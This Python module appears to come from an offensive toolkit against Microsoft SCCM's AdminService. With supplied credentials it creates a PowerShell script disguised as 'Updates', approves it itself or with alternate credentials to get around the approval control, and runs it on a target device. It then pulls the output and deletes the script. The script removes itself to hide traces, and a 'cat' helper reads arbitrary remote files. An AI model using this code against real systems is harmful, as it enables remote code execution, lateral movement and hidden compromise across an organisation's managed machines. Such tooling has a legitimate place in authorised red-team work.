import requests
from requests_ntlm import HttpNtlmAuth
from urllib3.exceptions import InsecureRequestWarning
import json
import base64
import uuid
import codecs
import time
from tabulate import tabulate
import pandas as dp
import os
from lib.logger import logger
from datetime import datetime


class SMSSCRIPTS:

    def __init__(self, username, password, target, logs_dir, auser, apassword):
        self.username = username
        self.password = password
        self.target = target
        self.logs_dir = logs_dir
        self.approve_user = auser
        self.approve_password = apassword
        self.headers = {'Content-Type': 'application/json; odata=verbose'}
        self.cwd = os.getcwd()
        self.appended = ""
        self.opid = ""
        self.guid = ""
        self.device = ""

    def run(self, device, optional_target=None):
        if optional_target:
             self.script = optional_target
        self.device = device
        self.add_script()

    def read_script(self):
        #make the script delete itself when done
        cleanup = '''
function Do-Delete {
    Del $MyInvocation.PSCommandPath
}
Do-Delete
'''
        try:
            with open(f"{self.script}", "r", encoding='utf-8') as f:
                file_content = f.read()
                file_content += cleanup
                bom = codecs.BOM_UTF16_LE
                byte_array = bom + file_content.encode('utf-16-le')
                script_body = base64.b64encode(byte_array).decode('utf-8')
            return script_body
        except Exception as e:
            logger.info(e)
        
    def get_results(self):
        url = f"https://{self.target}/AdminService/v1.0/Device({self.device})/AdminService.ScriptResult(OperationId={self.opid})"
        while True:
            try:
                body = {
                    "MoreResult": True
                }
                r = requests.request("GET",
                                    f"{url}",
                                    auth=HttpNtlmAuth(self.username, self.password),
                                    verify=False, json=body)
                if r.status_code == 404:
                    time.sleep(15)
                    continue
                logger.info("[+] Got result:")
                data = r.json()
                output = data['value']['Result'][0]
                result = output['ScriptOutput']
                result = result.replace('["', '')\
                    .replace('"]','')\
                    .replace(r"\u003e", ">")\
                    .replace(r"\r\n", "\n")\
                    .replace('","', "\n")\
                    .replace(',"', "\n")
                formatted_text = "\n".join(line.strip() for line in result.split(r"\n"))
                logger.info(formatted_text)
                self.printlog(formatted_text)
                return True
            except Exception as e:
                logger.info(e)
            return False
    
    def add_script(self, script_body=None):
        if script_body == None:
             script_body = self.read_script()
        self.guid = str(uuid.uuid4())
        body = {"ApprovalState": 3,
        "ParamsDefinition": "", 
        "ScriptName": "Updates",
        "Author": "",
        "Script": f"{script_body}",
        "ScriptVersion": "1",
        "ScriptType": 0,
        "ParameterlistXML": "",
        "ScriptGuid": f"{self.guid}"
        }
        url = f"https://{self.target}/AdminService/wmi/SMS_Scripts.CreateScripts/"

        try:
            r = requests.post(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers, json=body)
            if r.status_code == 201:
                    logger.info(f"[+] Updates script created successfully with GUID {self.guid}.")
                    self.approve_script()
        except Exception as e:
             logger.info(e)

    def approve_script(self):
        body = {"Approver":"",
                "ApprovalState": "3",
                "Comment": ""
                }
        
        url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/{self.guid}/AdminService.UpdateApprovalState"

        try:
            if self.approve_user:
                 logger.debug("[*] Using alternate credentials to approve script.")
                 username = self.approve_user
                 password = self.approve_password
            else:
                 username= self.username
                 password = self.password
            r = requests.post(f"{url}",
                                auth=HttpNtlmAuth(username, password),
                                verify=False,headers=self.headers, json=body)
            #print(r.status_code, r.text)
            if r.status_code == 201:
                logger.info(f"[+] Script with guid {self.guid} approved.")
                self.run_script()
            if r.status_code == 500:
                 logger.info(f"[-] Hierarchy settings do not allow author's to approve their own scripts. All custom script execution will fail.")
                 logger.info("[*] Try using alternate approval credentials.")
                 self.delete_script()

            #jlogger.info(results)
        except Exception as e:
                logger.info(e)

    def run_script(self):
        body = {"ScriptGuid": f"{self.guid}"}
        
        url = f"https://{self.target}/AdminService/v1.0/Device({self.device})/AdminService.RunScript"
        
        try:
            r = requests.post(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers, json=body)

            logger.info(f"[+] Script with guid {self.guid} executed.")
            json_result = r.json()
            self.opid = (json_result['value'])
            logger.debug(f"[+] Got OperationID: {self.opid}")
            result = self.get_results()
            if result:
                self.delete_script()
        except Exception as e:
                logger.info(e)

    def jprint(self, obj):
        try:
            text = json.dumps(obj, sort_keys=True, indent=4)
            logger.info(text)
        except ValueError:
            return
        
    def delete_script(self):
        url = f"https://{self.target}/AdminService/wmi/SMS_Scripts/{self.guid}"

        try:
            r = requests.delete(f"{url}",
                                auth=HttpNtlmAuth(self.username, self.password),
                                verify=False,headers=self.headers)
            if r.status_code == 204:
                logger.info(f"[+] Script with GUID {self.guid} deleted.")
        except Exception as e:
                logger.info(e)


    def cat(self, file, device):
        #filecontent cmpivot module doesn't work so here's the bandaid
        script = '''
function do-cat{
    $contents = (Get-Content -Path %s) -replace 111,222
    return $contents
}
function Do-Delete {
    Del $MyInvocation.PSCommandPath
}
do-cat
Do-Delete
''' %file 
        bom = codecs.BOM_UTF16_LE
        byte_array = bom + script.encode('utf-16-le')
        script_body = base64.b64encode(byte_array).decode('utf-8')
        self.device = device
        self.add_script(script_body)
        

    def printlog(self, result):
        filename = (f'{self.logs_dir}/console.log')
        dt = datetime.now()
        ts = str(dt)
        with open(filename, 'a') as f:
            f.write("--------"+ ts + "--------\n")
            f.write("{}\n".format(result))
            f.close
